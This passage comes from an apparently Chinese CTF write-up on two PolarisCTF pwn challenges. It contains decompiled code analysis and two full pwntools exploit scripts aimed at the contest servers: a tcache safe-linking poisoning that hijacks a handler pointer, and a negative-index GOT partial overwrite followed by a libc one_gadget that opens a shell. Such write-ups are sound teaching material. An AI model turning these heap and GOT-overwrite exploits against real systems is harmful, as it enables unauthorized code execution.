+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x10&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;io_weight&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">状态字段 &#x2F; 占位</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x18&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;latency_slo&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;backdoor_addr&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;handler&lt;/font&gt;**</code><br/><strong><font style="color:rgb(31, 31, 31);"> (后门函数指针)</font></strong></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x20&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;replicas&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;task_0_addr + 40&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;context&lt;/font&gt;**</code><br/><strong><font style="color:rgb(31, 31, 31);"> (传给后门函数的参数指针！)</font></strong></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x28&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;memo&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;b&quot;\x00&quot;*8&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;tag&lt;/font&gt;**</code><br/><strong><font style="color:rgb(31, 31, 31);"> 字符串 (随便)</font></strong></td>
+</tr>
+</tbody></table>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774766839823-a2bea1fa-f6cd-41e2-9d94-ca744826b0cf.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看case9</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 1. 提取结构体与函数指针</span><br><span class="hljs-comment">// a1: 392 字节的全局上下文 (buf)</span><br><span class="hljs-comment">// n7: 输入的 task_id (例如 0)</span><br><span class="hljs-comment">// 从 a1 + 40 (0x28) 处取出 Task 0 的绝对堆地址</span><br>v10 = *(_QWORD *)(a1 + <span class="hljs-number">8</span> * n7 + <span class="hljs-number">40</span>);<br><br><span class="hljs-keyword">if</span> ( v10 &amp;&amp; (sub_2FF0_1 = *(<span class="hljs-type">void</span> (__fastcall **)(_QWORD))(v10 + <span class="hljs-number">24</span>)) != <span class="hljs-number">0LL</span> ) <br>&#123;<br>    <span class="hljs-comment">// v10 + 24 (+0x18): handler 函数指针</span><br>    <span class="hljs-comment">// v10 + 32 (+0x20): context 参数指针</span><br><br>    <span class="hljs-comment">// 2. 白名单与策略校验</span><br>    <span class="hljs-keyword">if</span> ( sub_2FF0_1 == sub_2FF0                    <span class="hljs-comment">// 检查是否为默认函数 A</span><br>      || (<span class="hljs-type">char</span> *)sub_2FF0_1 == (<span class="hljs-type">char</span> *)sub_30A0    <span class="hljs-comment">// 检查是否为默认函数 B</span><br>      || *(_BYTE *)(*(_QWORD *)(a1 + <span class="hljs-number">32</span>) + <span class="hljs-number">8LL</span>) == <span class="hljs-number">0</span> <span class="hljs-comment">// 核心：检查 strict_policy 是否为 0</span><br>      || sub_2FF0_1 == sub_2F40 )                  <span class="hljs-comment">// 检查是否为默认函数 C</span><br>    &#123;<br>        <span class="hljs-comment">// 校验通过，执行函数调用</span><br>        <span class="hljs-comment">// 如果 strict_policy 被篡改为 0，则可以执行被替换后的 handler</span><br>        sub_2FF0_1(*(_QWORD *)(v10 + <span class="hljs-number">32</span>));                       <br>    &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-comment">// 策略拦截</span><br>        <span class="hljs-built_in">std</span>::__ostream_insert(..., <span class="hljs-string">&quot;policy engine blocked non-whitelisted handler&quot;</span>, ...);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以通过case2把strict_policy改成0</p>
+<p>看看case10</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 1. 泄露代码段基址 (diag.audit_sink)</span><br><span class="hljs-built_in">std</span>::__ostream_insert(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot; diag.audit_sink=&quot;</span>, <span class="hljs-number">17LL</span>);<br><span class="hljs-comment">// sub_3210 相当于 printf(&quot;%p&quot;)，通过打印函数地址 sub_6750 泄露 PIE 基址</span><br>sub_3210((__int64)&amp;v63, (__int64)sub_6750);  <br>v13 = (<span class="hljs-built_in">std</span>::ostream *)<span class="hljs-built_in">std</span>::__ostream_insert(v12, v63, v64);<br><br><span class="hljs-comment">// 2. 遍历 Session 槽位泄露堆地址与 Tcache 指针</span><br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i != <span class="hljs-number">16</span>; ++i ) <br>&#123;<br>    <span class="hljs-comment">// 从全局数组 (a1 + 0x68) 遍历 16 个 Session 槽位</span><br>    v22 = *(__int64 **)(a1 + <span class="hljs-number">8</span> * i + <span class="hljs-number">104</span>); <br>         <br>    <span class="hljs-keyword">if</span> ( v22 ) <br>    &#123; <br>        <span class="hljs-comment">// 漏洞点：只要槽位内指针非空即打印，忽略了 active 标志位状态</span><br>        <span class="hljs-built_in">std</span>::__ostream_insert(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot;[session:&quot;</span>, <span class="hljs-number">9LL</span>);<br>        <span class="hljs-comment">// ... 打印序号 ...</span><br>        <br>        <span class="hljs-comment">// 打印 Session 对象的绝对堆地址 (handle)</span><br>        <span class="hljs-built_in">std</span>::__ostream_insert(v24, <span class="hljs-string">&quot;] handle=&quot;</span>, <span class="hljs-number">9LL</span>);<br>        sub_3210((__int64)v60, v22);       <br>                 <br>        <span class="hljs-comment">// 打印 Session 对象前 8 字节的内容 (q0)</span><br>        <span class="hljs-comment">// 如果该堆块处于 free 状态，此处可能泄露 Tcache 的加密指针 (next)</span><br>        <span class="hljs-built_in">std</span>::__ostream_insert(v26, <span class="hljs-string">&quot; q0=&quot;</span>, <span class="hljs-number">4LL</span>);<br>        v23 = *v22;                        <br>        sub_3210((__int64)v62, v23);       <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>看看case11</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774767426444-99a10528-19b2-487c-aec6-af06ebabff39.png" srcset="/img/loading.gif" lazyload></p>
+<p>原来是凑数的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775131569426-4e7e366d-1706-4e73-bc32-8f477dd8dc97.png" srcset="/img/loading.gif" lazyload></p>
+<p>2.32以上就有safe-linking了</p>
+<p>有UAF时就可以直接得到heap_base_addr,pwn.college里写过太多了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>#<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>exe = <span class="hljs-string">&#x27;/home/shark/Desktop/ctf/temp/code/Polarisctf/ezheap/inference_forge&#x27;</span><br>context.binary = exe<br>flag = <span class="hljs-number">0</span><br><br>def start():<br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-keyword">return</span> process(exe)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="hljs-number">47430</span>)<br><br>p = start()<br><br>def cmd(choice): p.sendlineafter(b<span class="hljs-string">&quot;gateway&gt; &quot;</span>, str(choice).encode())<br><br>def add(slot, size, alias):<br>    cmd(<span class="hljs-number">5</span>)<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(slot).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(size).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, alias)<br><br>def <span class="hljs-built_in">free</span>(slot):<br>    cmd(<span class="hljs-number">6</span>)<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(slot).encode())<br><br>def edit(slot, idx, val):<br>    cmd(<span class="hljs-number">7</span>)<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(slot).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(idx).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(val).encode())<br><br>def worker(cpu, mem, io, slo, replicas, region, memo):<br>    cmd(<span class="hljs-number">8</span>)<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(cpu).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(mem).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(io).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(slo).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(replicas).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(region).encode())<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, memo)<br><br>def show(): cmd(<span class="hljs-number">10</span>)<br>def boot(): cmd(<span class="hljs-number">3</span>)<br>def chk(): cmd(<span class="hljs-number">4</span>)<br><br>def run(task_id):<br>    cmd(<span class="hljs-number">9</span>)<br>    p.sendlineafter(b<span class="hljs-string">&quot;&gt; &quot;</span>, str(task_id).encode())<br><br>show()<br>p.recvuntil(b<span class="hljs-string">&quot;diag.audit_sink=&quot;</span>)<br>backdoor_addr = <span class="hljs-type">int</span>(p.recvuntil(b<span class="hljs-string">&quot;\n&quot;</span>, drop=True).replace(b<span class="hljs-string">&quot;0x&quot;</span>, b<span class="hljs-string">&quot;&quot;</span>), <span class="hljs-number">16</span>)<br>print(f<span class="hljs-string">&quot;Backdoor: &#123;hex(backdoor_addr)&#125;&quot;</span>)<br>boot()<br>chk()<br>pause()<br>p.recvuntil(b<span class="hljs-string">&quot;queue_ctrl=&quot;</span>)<br>queue_ctrl_addr = <span class="hljs-type">int</span>(p.recvuntil(b<span class="hljs-string">&quot; &quot;</span>, drop=True).replace(b<span class="hljs-string">&quot;0x&quot;</span>, b<span class="hljs-string">&quot;&quot;</span>), <span class="hljs-number">16</span>)<br>print(f<span class="hljs-string">&quot;Queue Control: &#123;hex(queue_ctrl_addr)&#125;&quot;</span>)<br>p.recvuntil(b<span class="hljs-string">&quot;[task:0] desc=&quot;</span>)<br>task_0_addr = <span class="hljs-type">int</span>(p.recvuntil(b<span class="hljs-string">&quot; &quot;</span>, drop=True).replace(b<span class="hljs-string">&quot;0x&quot;</span>, b<span class="hljs-string">&quot;&quot;</span>), <span class="hljs-number">16</span>)<br>print(f<span class="hljs-string">&quot;Task 0: &#123;hex(task_0_addr)&#125;&quot;</span>)<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, b<span class="hljs-string">&quot;1337&quot;</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br>show()<br><br>p.recvuntil(b<span class="hljs-string">&quot;[session:0] handle=&quot;</span>)<br>p.recvuntil(b<span class="hljs-string">&quot;q0=&quot;</span>)<br>leak_addr = <span class="hljs-type">int</span>(p.recvuntil(b<span class="hljs-string">&quot; &quot;</span>, drop=True).replace(b<span class="hljs-string">&quot;0x&quot;</span>, b<span class="hljs-string">&quot;&quot;</span>), <span class="hljs-number">16</span>)<br>heap_base_addr = leak_addr &lt;&lt; <span class="hljs-number">12</span><br>print(f<span class="hljs-string">&quot;Heap Base: &#123;hex(heap_base_addr)&#125;&quot;</span>)<span class="hljs-meta">#same as the pwn.college<span class="hljs-string">&#x27;s DAM</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">add(1, 16, b&quot;a&quot;)</span></span><br><span class="hljs-string"><span class="hljs-meta">add(2, 16, b&quot;b&quot;)</span></span><br><span class="hljs-string"><span class="hljs-meta">free(2)</span></span><br><span class="hljs-string"><span class="hljs-meta">free(1)</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">obfuscated_queue = queue_ctrl_addr ^ (heap_base_addr &gt;&gt; 12)</span></span><br><span class="hljs-string"><span class="hljs-meta">edit(1, 0, obfuscated_queue)</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">add(3, 16, b&quot;kkkk&quot;)</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">worker(</span></span><br><span class="hljs-string"><span class="hljs-meta">    cpu = 0x49464F524745,  </span></span><br><span class="hljs-string"><span class="hljs-meta">    mem = 0,              # 关闭白名单</span></span><br><span class="hljs-string"><span class="hljs-meta">    io = 0, slo = 0, replicas = 0, region = 0, </span></span><br><span class="hljs-string"><span class="hljs-meta">    memo = b&quot;\x00&quot;</span></span><br><span class="hljs-string"><span class="hljs-meta">)</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">#hijack Task </span></span><br><span class="hljs-string"><span class="hljs-meta">add(5, 16, b&quot;c&quot;)</span></span><br><span class="hljs-string"><span class="hljs-meta">add(6, 16, b&quot;d&quot;)</span></span><br><span class="hljs-string"><span class="hljs-meta">free(6)</span></span><br><span class="hljs-string"><span class="hljs-meta">free(5)</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">obfuscated_task = task_0_addr ^ (heap_base_addr &gt;&gt; 12)</span></span><br><span class="hljs-string"><span class="hljs-meta">edit(5, 0, obfuscated_task)</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">add(7, 16, b&quot;shark&quot;)</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">worker(</span></span><br><span class="hljs-string"><span class="hljs-meta">    cpu = 0,                     # +0x00: task_id</span></span><br><span class="hljs-string"><span class="hljs-meta">    mem = 0,                     # +0x08: arg0</span></span><br><span class="hljs-string"><span class="hljs-meta">    io  = 0,                     # +0x10: state</span></span><br><span class="hljs-string"><span class="hljs-meta">    slo = backdoor_addr,         # +0x18: backdoor</span></span><br><span class="hljs-string"><span class="hljs-meta">    replicas = task_0_addr + 40, # +0x20: pointer to memo</span></span><br><span class="hljs-string"><span class="hljs-meta">    region = 0,</span></span><br><span class="hljs-string"><span class="hljs-meta">    memo = b&#x27;</span>\x00<span class="hljs-string">&#x27;        </span></span><br><span class="hljs-string"><span class="hljs-meta">)</span></span><br><span class="hljs-string"><span class="hljs-meta">print(&quot;finaly •᷄ࡇ•᷅&quot;)</span></span><br><span class="hljs-string"><span class="hljs-meta">run(0)</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">p.interactive()</span></span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775132678545-46a7f1b0-e85c-4ccc-83ad-73ce2b9dd6c6.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775133126809-6676d8e6-0e0f-4c75-9a48-2c384ce205c0.png" srcset="/img/loading.gif" lazyload></p>
+<p>这题的阅读实在有点困难</p>
+<p>•᷄ࡇ•᷅</p>
+<h2 id="treasure"><a href="#treasure" class="headerlink" title="treasure"></a><font style="color:rgb(17, 24, 28);">treasure</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774769557716-81bf2c59-10d1-4296-a835-2a100ae0c7c6.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774769573424-e83a97d6-990b-4be9-aecc-48492920410c.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774769585626-6f15df6d-67b2-4605-b76a-253351c2fa49.png" srcset="/img/loading.gif" lazyload></p>
+<p>伪c可比伪cpp清秀多了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770387924-da6db9b0-0ecd-48ee-b3ec-ba097a283c33.png" srcset="/img/loading.gif" lazyload></p>
+<p>这开了pie就几乎不太可能猜对了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770552848-4aeb1a7c-da54-44d3-b85b-8d04354741a8.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770562924-8d03007f-9714-418c-9d4f-b37db94ec9a7.png" srcset="/img/loading.gif" lazyload></p>
+<p>看来是要覆盖got表拿shell</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770639450-0c8ef403-2994-4a3c-a617-89b4f8107d0d.png" srcset="/img/loading.gif" lazyload></p>
+<p>我去，有负index</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770666326-1cc70204-1b68-4491-a18f-810141649756.jpeg" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774771561042-00a2107c-a949-4928-8824-dabb0b08a6d5.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774772461712-6d742006-83fc-4999-9107-d7848dcea9de.png" srcset="/img/loading.gif" lazyload></p>
+<p>但直接覆盖got的话后续的call function会error</p>
+<p>可以只覆盖低一字节，libc.sys一下就行</p>
+<p>然后得到leak_addr,算出libc_base_addr</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774773850707-657b42a8-a20f-448f-85ef-833163b51d7c.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里用0xef52b,<!-- 这是一张图片，ocr 内容为： --><br><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774773916491-055d8352-662e-416f-88a1-a1dd2b063600.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过input name可以将rbp-0x78,rbp-0x50覆盖为0</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774774022980-9a287ad4-4a1f-432b-9205-46dca8fd41dc.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774774056784-cb159475-3a7a-4b0f-81cb-c9002f175580.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774774226837-94fc652b-fb5c-441a-ba2a-9ac8f715e59b.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775039041676-1daceb17-d955-4fd6-bf0c-2e3932933921.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774774278009-05674c76-1269-40b5-8797-9976b7b5e29d.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br><br>exe = <span class="hljs-string">&#x27;/home/shark/Desktop/ctf/temp/code/Polarisctf/pwn-treasure/attachments/pwn-treasure&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;/home/shark/Desktop/ctf/temp/code/Polarisctf/pwn-treasure/attachments/pwn-treasure&#x27;</span>)<br><span class="hljs-meta">#libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)  </span><br>libc = ELF(<span class="hljs-string">&#x27;/home/shark/Desktop/ctf/temp/code/Polarisctf/pwn-treasure/attachments/libc.so.6&#x27;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = elf<br>flag = <span class="hljs-number">0</span><br><br>def start():<br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-keyword">return</span> process(exe)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">44046</span>)<br><br>io = start()<br><br>io.recvuntil(b<span class="hljs-string">&quot;password: &quot;</span>)<br>io.sendline(b<span class="hljs-string">&quot;1&quot;</span>)<br><br>io.recvuntil(b<span class="hljs-string">&quot;Which one?\n&quot;</span>)<br>io.sendline(b<span class="hljs-string">&quot;-14&quot;</span>)<br><br>sleep(<span class="hljs-number">0.1</span>)<br>system_low = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] &amp; <span class="hljs-number">0xff</span><br>io.send(p8(system_low))<br><br>io.recvuntil(b<span class="hljs-string">&quot;the context: &quot;</span>)<br>leak_system_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc_base = leak_system_addr - libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>print(f<span class="hljs-string">&quot;system addr : &#123;hex(leak_system_addr)&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;Libc Base : &#123;hex(libc_base)&#125;&quot;</span>)<br><br>io.recvuntil(b<span class="hljs-string">&quot;you should tell me your name.\n&quot;</span>)<br>io.sendline(b<span class="hljs-string">&quot;\x00&quot;</span> * <span class="hljs-number">64</span> + b<span class="hljs-string">&quot;\n&quot;</span>)<br><br>io.recvuntil(b<span class="hljs-string">&quot;Last time!Lucky, guy!\n&quot;</span>)<br>io.sendline(b<span class="hljs-string">&quot;-13&quot;</span>)<br><br>sleep(<span class="hljs-number">0.1</span>)<br>offset = <span class="hljs-number">0xebd3f</span><br>gadget_addr = libc_base + offset<br>print(f<span class="hljs-string">&quot;Gadget: &#123;hex(gadget_addr)&#125;&quot;</span>)<br><span class="hljs-meta">#gdb.attach(io, <span class="hljs-string">&#x27;&#x27;&#x27;</span></span><br><span class="hljs-meta">#    b printf</span><br><span class="hljs-meta">#    c</span><br>#<span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>io.send(p64(gadget_addr))<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>offset那块要注意treasure连的libc.so.6是哪个</p>
+<!-- 这是一张图片，ocr 内容为： -->
